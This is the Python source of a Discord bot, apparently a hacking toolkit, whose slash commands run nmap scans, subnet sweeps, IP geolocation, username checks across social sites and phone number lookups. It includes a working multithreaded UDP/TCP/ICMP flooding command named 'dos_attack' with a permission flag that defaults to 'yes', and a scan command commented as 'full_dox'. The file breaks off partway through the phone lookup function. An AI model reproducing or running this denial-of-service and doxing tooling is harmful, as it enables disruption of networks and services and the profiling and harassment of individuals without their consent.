import discord
from discord.ext import commands
from discord import app_commands
import subprocess
import requests
import socket
import platform
from datetime import datetime
import time
import random
import threading
import asyncio
import aiohttp
import phonenumbers
from phonenumbers import geocoder, carrier, NumberParseException, PhoneNumberType
import dns.resolver


# -----------------------------
# SETTINGS - EDIT THESE
BOT_TOKEN = "BOT TOKEN HERE"
CHANNEL_ID = CHANNEL ID HERE  # Change to your target channel ID
# -----------------------------

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

# banner
BANNER = """
 *  *  *  *   *  *  *  *
  *  *  *  *  *  *  *  *  *  *  *  
*  *  *  *  *  *  *  *  *  *  *  *  
*  *  *  *  *  *  *  *  *  *  
    *   *  * 𐋄 Ꝋ 𐌀  *   *    *  
 *  *  *  *  *  X *   * *  *  *  
*     *  C O R A L I N E  * *  * *  
  *  *  *   *  *  *  *  *  *  *  
    *  *  *  *  *  *  *  *  *  *  *  
  *  *  *  *  *  *  *  *  *  *  *  
➫ 𐌌𐌀𐌃𐌄 𐌁𐌙 𐌔𐌊𐌉𐌃 𐌋𐌀𐌓𐌐 
"""

# Print the banner
print(BANNER)

# LOADING ANIMATION
print("ℓσα∂เɳɠ ɓoƭ2 ", end='', flush=True)
for _ in range(10):
    print('*  *  * * ', end='', flush=True)
    time.sleep(0.2)
print() 

# Print bot started message
print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ɓoƭ2 started successfully")

# HELPER FUNCTIONS
def channel_only(interaction: discord.Interaction):
    return interaction.channel.id == CHANNEL_ID

async def progress_message(interaction, msg):
    await interaction.response.send_message(f"{msg}", ephemeral=True)

# EVENTS
@bot.event
async def on_ready():
    await tree.sync()
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(f"```{BANNER}\n𐋄 Ꝋ 𐌀 ɓoƭ2 ONLINE - Click '/' In Discord Server to Veiw commands.\n```")

# COMMANDS 

# /IpLookup
@tree.command(name="iplookup", description="Retrieve detailed info about an IP address.")
@app_commands.describe(ip="Enter the IP address to lookup")
async def iplookup(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Running IP Lookup for {ip}...")
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json").json()
        output = f"""\n╔═ IP LOOKUP ═════════════════════╗
IP: {ip}
Hostname: {r.get('hostname','N/A')}
City: {r.get('city','N/A')}
Region: {r.get('region','N/A')}
Country: {r.get('country','N/A')}
Location: {r.get('loc','N/A')}
Org: {r.get('org','N/A')}
Timezone: {r.get('timezone','N/A')}
Postal: {r.get('postal','N/A')}
╚════════════════════════════════╝\n"""
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error fetching IP info: {e}")

# /Port_Scan
@tree.command(name="port_scan", description="Scan open ports on an IP using nmap.")
@app_commands.describe(ip="Enter the IP address to scan")
async def port_scan(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Running Port Scan for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "-T4", "-F", ip], text=True)
        await interaction.edit_original_response(content=f"```PORT SCAN for {ip}\n{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error running nmap: {e}")

# /Ping
@tree.command(name="ping", description="Ping an IP or domain 10 times.")
@app_commands.describe(host="IP or domain to ping")
async def ping(interaction: discord.Interaction, host: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Running Ping for {host}...")
    count_flag = '-n' if platform.system() == 'Windows' else '-c'
    try:
        result = subprocess.check_output(["ping", count_flag, "10", host], text=True)
        await interaction.edit_original_response(content=f"```PING RESULTS for {host}\n{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error running ping: {e}")

# /Domain_Lookup
@tree.command(name="domain_lookup", description="Resolve domain to IP.")
@app_commands.describe(domain="Enter the domain")
async def domain_lookup(interaction: discord.Interaction, domain: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Resolving domain {domain}...")
    try:
        ip = socket.gethostbyname(domain)
        output = f"""\n╔═ DOMAIN LOOKUP ═════════════╗
Domain: {domain}
Resolved IP: {ip}
╚═════════════════════════════╝\n"""
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error resolving domain {domain}: {e}")

# /Reverse_DNS
@tree.command(name="reverse_dns", description="Reverse lookup IP to get domain.")
@app_commands.describe(ip="Enter IP address")
async def reverse_dns(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Performing Reverse DNS lookup for {ip}...")
    try:
        domain = socket.gethostbyaddr(ip)[0]
        output = f"""\n╔═ REVERSE DNS ═════════════╗
IP: {ip}
Domain: {domain}
╚═══════════════════════════╝\n"""
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error performing reverse DNS: {e}")

# /Geo_Locate
@tree.command(name="geo_locate", description="Get geolocation info for an IP.")
@app_commands.describe(ip="Enter IP address")
async def geo_locate(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Fetching geolocation for {ip}...")
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json").json()
        output = f"""\n╔═ GEOLOCATION ═════════════╗
IP: {ip}
City: {r.get('city','N/A')}
Region: {r.get('region','N/A')}
Country: {r.get('country','N/A')}
Coordinates: {r.get('loc','N/A')}
Org: {r.get('org','N/A')}
Timezone: {r.get('timezone','N/A')}
╚═══════════════════════════╝\n"""
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error fetching geolocation: {e}")

# /Traceroute
@tree.command(name="traceroute", description="Perform traceroute to an IP/domain")
@app_commands.describe(host="IP or domain to traceroute")
async def traceroute(interaction: discord.Interaction, host: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Running traceroute for {host}...")
    cmd = ["tracert" if platform.system() == "Windows" else "traceroute", host]
    try:
        result = subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
        await interaction.edit_original_response(content=f"```TRACEROUTE RESULTS for {host}\n{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error running traceroute: {e}")

# /DNS_Lookup
@tree.command(name="dns_lookup", description="Lookup A/AAAA/MX records for a domain")
@app_commands.describe(domain="Domain to lookup")
async def dns_lookup(interaction: discord.Interaction, domain: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Looking up DNS for {domain}...")
    try:
        info = socket.gethostbyname_ex(domain)
        output = f"\n╔═ DNS LOOKUP ═════════════╗\nDomain: {domain}\nAliases: {', '.join(info[1])}\nIP Addresses: {', '.join(info[2])}\n╚══════════════════════════╝"
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error during DNS lookup: {e}")

# /ASN_Lookup
@tree.command(name="asn_lookup", description="Retrieve ASN info for an IP")
@app_commands.describe(ip="IP address to lookup")
async def asn_lookup(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Fetching ASN info for {ip}...")
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json").json()
        output = f"\n╔═ ASN LOOKUP ═════════════╗\nIP: {ip}\nASN: {r.get('org','N/A')}\n╚══════════════════════════╝"
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error fetching ASN info: {e}")

# /WhoAmI
@tree.command(name="whoami", description="Display bot's hostname and public IP")
async def whoami(interaction: discord.Interaction):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, "Fetching bot info...")
    try:
        hostname = socket.gethostname()
        public_ip = requests.get("https://api.ipify.org").text
        output = f"\n╔═ WHOAMI ═════════════╗\nHostname: {hostname}\nPublic IP: {public_ip}\n╚═══════════════════════╝"
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error fetching bot info: {e}")

# /Check_Port
@tree.command(name="check_port", description="Check if a TCP port is open on a host")
@app_commands.describe(host="IP or domain", port="Port number")
async def check_port(interaction: discord.Interaction, host: str, port: int):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, f"Checking port {port} on {host}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((host, port))
        sock.close()
        status = "OPEN" if result == 0 else "CLOSED"
        output = f"\n╔═ PORT CHECK ═════════════╗\nHost: {host}\nPort: {port}\nStatus: {status}\n╚══════════════════════════╝"
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error checking port: {e}")

# /Local_IP
@tree.command(name="local_ip", description="List all local IP addresses")
async def local_ip(interaction: discord.Interaction):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted to a specific channel.", ephemeral=True)
    await progress_message(interaction, "Fetching local IP addresses...")
    try:
        hostname = socket.gethostname()
        ips = socket.gethostbyname_ex(hostname)[2]
        output = f"\n╔═ LOCAL IPs ═════════════╗\n{', '.join(ips)}\n╚═════════════════════════╝"
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error fetching local IPs: {e}")

# /Subnet_Scan
@tree.command(name="subnet_scan", description="Scan a subnet for active hosts (ping sweep)")
@app_commands.describe(subnet="Subnet in format 192.168.1.0/24")
async def subnet_scan(interaction: discord.Interaction, subnet: str):
    if not channel_only(interaction): return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Scanning subnet {subnet} for active hosts...")
    try:
        active_hosts = []
        base = subnet.split('/')[0].rsplit('.',1)[0]+'.'
        for i in range(1,255):
            ip = f"{base}{i}"
            count_flag = '-n' if platform.system() == 'Windows' else '-c'
            result = subprocess.run(["ping", count_flag, "1", ip], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            if result.returncode == 0:
                active_hosts.append(ip)
        output = f"\n╔═ SUBNET SCAN ═════════════╗\nActive Hosts:\n{', '.join(active_hosts)}\n╚════════════════════════════╝"
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error scanning subnet: {e}")

# /Ping_Stats
@tree.command(name="ping_stats", description="Show average ping statistics to a host")
@app_commands.describe(host="IP or domain")
async def ping_stats(interaction: discord.Interaction, host: str):
    if not channel_only(interaction): return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Gathering ping stats for {host}...")
    try:
        count_flag = '-n' if platform.system()=='Windows' else '-c'
        result = subprocess.check_output(["ping", count_flag, "10", host], text=True)
        output = f"\n╔═ PING STATS ═════════════╗\n{result}\n╚══════════════════════════╝"
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error gathering ping stats: {e}")

# /Traceroute 
@tree.command(name="reverse_trace", description="Traceroute to target using nmap (path shown).")
@app_commands.describe(host="IP or domain")
async def reverse_trace(interaction: discord.Interaction, host: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Running traceroute to {host} using nmap...")

    try:
        # Run nmap with traceroute
        result = subprocess.check_output(["nmap", "--traceroute", "-Pn", host], text=True)

        # Extract just the traceroute section from nmap output
        lines = result.splitlines()
        traceroute_lines = []
        capture = False
        for line in lines:
            if "TRACEROUTE" in line:
                capture = True
            if capture:
                traceroute_lines.append(line)

        output = "\n".join(traceroute_lines)
        formatted_output = f"\n╔═ TRACEROUTE ═══════════════════╗\nTarget: {host}\n{output}\n╚═════════════════════════════════════╝"

        await interaction.edit_original_response(content=f"```{formatted_output}```")

    except subprocess.CalledProcessError as e:
        await interaction.edit_original_response(content=f"Error running nmap traceroute: {e.output}")
    except Exception as e:
        await interaction.edit_original_response(content=f"Unexpected error: {e}")

# /Latency_Test
@tree.command(name="latency_test", description="Measure latency to a host")
@app_commands.describe(host="IP or domain")
async def latency_test(interaction: discord.Interaction, host: str):
    if not channel_only(interaction): return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Measuring latency to {host}...")
    try:
        count_flag = '-n' if platform.system() == 'Windows' else '-c'
        result = subprocess.check_output(["ping", count_flag, "4", host], text=True)
        output = f"\n╔═ LATENCY TEST ═════════════╗\n{result}\n╚════════════════════════════╝"
        await interaction.edit_original_response(content=f"```{output}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error measuring latency: {e}")

# /os_detection
@tree.command(name="os_detection", description="Detect the OS of a target host using Nmap")
@app_commands.describe(ip="Target IP or domain")
async def os_detection(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Detecting OS for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "-O", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error detecting OS: {e}")

# /version_detection
@tree.command(name="version_detection", description="Detect service versions on open ports using Nmap")
@app_commands.describe(ip="Target IP or domain")
async def version_detection(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Detecting service versions for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "-sV", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error detecting versions: {e}")

# /aggressive_scan
@tree.command(name="aggressive_scan", description="Perform aggressive scan including OS, versions, traceroute, scripts")
@app_commands.describe(ip="Target IP or domain")
async def aggressive_scan(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Running aggressive scan for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "-A", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error running aggressive scan: {e}")

# /vuln_scan
@tree.command(name="vuln_scan", description="Run basic vulnerability scan using Nmap scripts")
@app_commands.describe(ip="Target IP or domain")
async def vuln_scan(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Running vulnerability scan for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "--script", "vuln", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error running vulnerability scan: {e}")

# /http_headers
@tree.command(name="http_headers", description="Check HTTP headers on a web server")
@app_commands.describe(ip="Target IP or domain")
async def http_headers(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Checking HTTP headers for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "--script", "http-headers", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error checking HTTP headers: {e}")

# /ftp_anon
@tree.command(name="ftp_anon", description="Check for anonymous FTP access")
@app_commands.describe(ip="Target IP or domain")
async def ftp_anon(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Checking anonymous FTP for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "-p21", "--script", "ftp-anon", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error checking FTP: {e}")

# /ssh_enum
@tree.command(name="ssh_enum", description="Enumerate SSH algorithms")
@app_commands.describe(ip="Target IP or domain")
async def ssh_enum(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Enumerating SSH algorithms for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "-p22", "--script", "ssh2-enum-algos", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error enumerating SSH: {e}")

# /tcp_syn_scan
@tree.command(name="tcp_syn_scan", description="Perform stealthy SYN scan")
@app_commands.describe(ip="Target IP or domain")
async def tcp_syn_scan(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Running TCP SYN scan for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "-sS", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error running SYN scan: {e}")

# /udp_scan
@tree.command(name="udp_scan", description="Scan for UDP services")
@app_commands.describe(ip="Target IP or domain")
async def udp_scan(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Running UDP scan for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "-sU", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error running UDP scan: {e}")

# /firewall_detection
@tree.command(name="firewall_detection", description="Check firewall filtering using ACK scan")
@app_commands.describe(ip="Target IP or domain")
async def firewall_detection(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Running firewall detection for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "-sA", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error running firewall detection: {e}")

# /ssl_info
@tree.command(name="ssl_info", description="Get SSL certificate details for HTTPS")
@app_commands.describe(ip="Target IP or domain")
async def ssl_info(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Fetching SSL info for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "--script", "ssl-cert", "-p443", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error fetching SSL info: {e}")

# /http_title
@tree.command(name="http_title", description="Grab website title from HTTP server")
@app_commands.describe(ip="Target IP or domain")
async def http_title(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Fetching HTTP title for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "-p80", "--script", "http-title", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error fetching HTTP title: {e}")

# /open_proxy_check
@tree.command(name="open_proxy_check", description="Check if the target is an open HTTP proxy")
@app_commands.describe(ip="Target IP or domain")
async def open_proxy_check(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Checking open proxy for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "--script", "http-open-proxy", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error checking open proxy: {e}")

# /snmp_check
@tree.command(name="snmp_check", description="Check SNMP exposure")
@app_commands.describe(ip="Target IP or domain")
async def snmp_check(interaction: discord.Interaction, ip: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)
    await progress_message(interaction, f"Checking SNMP for {ip}...")
    try:
        result = subprocess.check_output(["nmap", "-sU", "-p161", "--script", "snmp-info", ip], text=True)
        await interaction.edit_original_response(content=f"```{result}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"Error checking SNMP: {e}")

# /dos_attack
def send_packet(protocol, ip, port, size):
    data = random._urandom(size)
    try:
        if protocol == "tcp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(data)
            sock.close()
        elif protocol == "udp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(data, (ip, port))
        elif protocol == "icmp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
            sock.sendto(data, (ip, 0))
    except:
        pass

@tree.command(name="dos_attack", description="DOS - Denial of Service - Single Personal Attack")
@app_commands.describe(
    ip="Target IP",
    port="Target port (ignored for ICMP)",
    packets="Number of packets per thread",
    threads="Number of concurrent threads",
    size="Packet size in bytes",
    delay="Delay between packets (seconds)",
    protocol="Protocol: udp, tcp, icmp",
    permission="Confirm permission: yes/no"
)
async def dos_attack(interaction: discord.Interaction, ip: str, port: int = 80, packets: int = 50000, threads: int = 10, size: int = 65500, delay: float = 0.0, protocol: str = "udp", permission: str = "yes"):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted.", ephemeral=True)
    
    if permission.lower() != "yes":
        return await interaction.response.send_message("I Do Not Take Any Legal Problem's Caused!", ephemeral=True)

    await progress_message(interaction, f"Starting {protocol.upper()} DOS on {ip}:{port} with {threads} threads and {packets} packets each...")

    def worker():
        for _ in range(packets):
            send_packet(protocol.lower(), ip, port, size)
            if delay > 0:
                time.sleep(delay)
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    await interaction.edit_original_response(content=f"DOS completed on {ip}:{port} using {protocol.upper()} ({packets*threads} packets total, {threads} threads).")

# full_dox
@tree.command(name="full_scan", description="Full network scan for IP or domain (Ping, Nmap, DNS, Banner grabbing).")
@app_commands.describe(
    host="Target IP or domain",
    aggressive="Enable aggressive Nmap scan? (yes/no)",
    ports="Comma-separated ports to scan (optional)",
    scripts="Extra Nmap scripts to run (optional, comma-separated)"
)
async def full_scan(
    interaction: discord.Interaction,
    host: str,
    aggressive: str = "yes",
    ports: str = None,
    scripts: str = None
):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)

    await progress_message(interaction, f"Starting full scan for {host}...")

    output = []

    # Ping
    try:
        ping_result = subprocess.run(["ping", "-c", "25", host], capture_output=True, text=True, timeout=30)
        output.append("╔═ PING ══════════════════════╗")
        output.append(ping_result.stdout.strip())
        output.append("╚═════════════════════════════╝")
    except Exception as e:
        output.append(f"Ping error: {e}")

    # Nmap (full scan + optional customizations)
    nmap_cmd = ["nmap", "-sS", "-sV", "-O", "-T4", "-p-"]  # base flags

    # Aggressive
    if aggressive.lower() == "yes":
        nmap_cmd.append("-A")  # OS detection, scripts, traceroute

    # Custom ports
    if ports:
        nmap_cmd.extend(["-p", ports])

    # Banner grabbing script
    nmap_scripts = ["banner"]
    if scripts:
        nmap_scripts.extend(scripts.split(","))

    nmap_cmd.extend(["--script", ",".join(nmap_scripts)])
    nmap_cmd.append(host)

    try:
        await interaction.edit_original_response(content="Running Nmap scan, this may take a while...")
        nmap_result = subprocess.run(nmap_cmd, capture_output=True, text=True, timeout=300)
        output.append("╔═ NMAP SCAN ═════════════════╗")
        output.append(nmap_result.stdout.strip())
        output.append("╚═════════════════════════════╝")
    except Exception as e:
        output.append(f"Nmap error: {e}")

    # DNS Lookup
    try:
        ns_result = subprocess.run(["nslookup", host], capture_output=True, text=True, timeout=15)
        output.append("╔═ DNS LOOKUP ════════════════╗")
        output.append(ns_result.stdout.strip())
        output.append("╚═════════════════════════════╝")
    except Exception as e:
        output.append(f"DNS lookup error: {e}")

    # Combine output and handle long messages
    final_output = "\n".join(output)
    max_len = 1900  # leave buffer for code block
    if len(final_output) <= max_len:
        await interaction.edit_original_response(content=f"```{final_output}```")
    else:
        chunks = [final_output[i:i+max_len] for i in range(0, len(final_output), max_len)]
        await interaction.edit_original_response(content=f"```{chunks[0]}```")
        for chunk in chunks[1:]:
            await interaction.channel.send(f"```{chunk}```")

# cidr_scan
@tree.command(name="cidr_scan", description="Scan an entire CIDR subnet")
@app_commands.describe(
    cidr="CIDR range (e.g., 192.168.1.0/24)",
    aggressive="Enable aggressive Nmap scan? (yes/no)",
    ports="Comma-separated ports to scan (optional)",
    scripts="Extra Nmap scripts to run (optional, comma-separated)"
)
async def cidr_scan(
    interaction: discord.Interaction,
    cidr: str,
    aggressive: str = "no",
    ports: str = None,
    scripts: str = None
):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)

    await progress_message(interaction, f"Starting CIDR scan for {cidr}...")

    nmap_cmd = ["nmap", "-sS", "-T4"]  # TCP SYN scan, faster timing

    # Ping sweep if not doing full aggressive
    if aggressive.lower() != "yes":
        nmap_cmd.append("-sn")  # Only ping scan

    # Aggressive scan
    if aggressive.lower() == "yes":
        nmap_cmd.extend(["-A", "-sV", "-O"])  # OS detection, version, traceroute

    # Custom ports
    if ports:
        nmap_cmd.extend(["-p", ports])

    # Scripts
    nmap_scripts = []
    if scripts:
        nmap_scripts.extend(scripts.split(","))
    if nmap_scripts:
        nmap_cmd.extend(["--script", ",".join(nmap_scripts)])

    nmap_cmd.append(cidr)

    try:
        await interaction.edit_original_response(content=f"Scanning CIDR {cidr} with Nmap, this may take a while...")
        nmap_result = subprocess.run(nmap_cmd, capture_output=True, text=True, timeout=600)
        output = []
        output.append(f"╔═ CIDR SCAN: {cidr} ═══════════╗")
        output.append(nmap_result.stdout.strip())
        output.append("╚═════════════════════════════╝")
        final_output = "\n".join(output)

        # Split long output into multiple messages
        max_len = 1900
        if len(final_output) <= max_len:
            await interaction.edit_original_response(content=f"```{final_output}```")
        else:
            chunks = [final_output[i:i+max_len] for i in range(0, len(final_output), max_len)]
            await interaction.edit_original_response(content=f"```{chunks[0]}```")
            for chunk in chunks[1:]:
                await interaction.channel.send(f"```{chunk}```")
    except Exception as e:
        await interaction.edit_original_response(content=f"CIDR scan error: {e}")

@tree.command(name="social_lookup", description="Check if a username exists on public social platforms.")
@app_commands.describe(username="Username to search for")
async def social_lookup(interaction: discord.Interaction, username: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)

    await progress_message(interaction, f"Checking username `{username}` across public platforms...")

    platforms = {
        "GitHub": f"https://github.com/{username}",
        "Twitter": f"https://twitter.com/{username}",
        "Reddit": f"https://www.reddit.com/user/{username}",
        "Instagram": f"https://www.instagram.com/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "YouTube": f"https://www.youtube.com/@{username}",
        "LinkedIn": f"https://www.linkedin.com/in/{username}",
        "Pinterest": f"https://www.pinterest.com/{username}",
        "StackOverflow": f"https://stackoverflow.com/users/{username}",
        "Medium": f"https://medium.com/@{username}"
    }

    results = []

    async with aiohttp.ClientSession() as session:
        for platform, url in platforms.items():
            try:
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        results.append(f"{platform}: Found ({url})")
                    else:
                        results.append(f"{platform}: Not found")
            except Exception as e:
                results.append(f"{platform}: Error ({e})")
            await asyncio.sleep(0.5)  # small delay to avoid rate limits

    # Format output nicely
    output = ["╔═ SOCIAL LOOKUP RESULTS ═════════╗"]
    output.extend(results)
    output.append("╚═════════════════════════════════╝")

    # Discord message limit
    final_output = "\n".join(output)
    if len(final_output) > 1900:
        final_output = final_output[:1900] + "\n...output truncated..."

    await interaction.edit_original_response(content=f"```{final_output}```")

# phonenum_lookup
class DismissView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

@tree.command(name="phone_lookup", description="Lookup phone number info with city and state")
@app_commands.describe(phone="Phone number with country code, e.g., +14155552671")
async def phone_lookup(interaction: discord.Interaction, phone: str):
    if not channel_only(interaction):
        return await interaction.response.send_message("Command restricted", ephemeral=True)

    await interaction.response.defer(ephemeral=True)

    try:
        num = phonenumbers.parse(phone, None)
        valid = phonenumbers.is_valid_number(num)

        # Get region/state + city separately
        full_region = geocoder.description_for_number(num, "en")  # e.g., "California"
        city = None
        state = None

        if full_region:
            parts = full_region.split(",")  # some descriptions are "City, State"
            if len(parts) == 2:
                city, state = parts[0].strip(), parts[1].strip()
            else:
                # fallback: treat all as state if city not available
                state = full_region.strip()

        carrier_name = carrier.name_for_number(num, "en")
        line_type_enum = phonenumbers.number_type(num)

        type_map = {
            PhoneNumberType.FIXED_LINE: "Fixed line",
            PhoneNumberType.MOBILE: "Mobile",
            PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed line/Mobile",
            PhoneNumberType.TOLL_FREE: "Toll free",
            PhoneNumberType.PREMIUM_RATE: "Premium rate",
            PhoneNumberType.SHARED_COST: "Shared cost",
            PhoneNumberType.VOIP: "VOIP",
            PhoneNumberType.PERSONAL_NUMBER: "Personal",
            PhoneNumberType.PAGER: "Pager",
            PhoneNumberType.UAN: "UAN",
            PhoneNumberType.VOICEMAIL: "Voicemail",
            PhoneNumberType.UNKNOWN: "Unknown"
        }

        output = [
            "╔═      PHONE LOOKUP    ══════════╗",
            f"Number: {phone}",
            f"Valid: {'Yes' if valid else 'No'}",
            f"Country code: +{num.country_code}",
            f"National number: {num.national_number}",
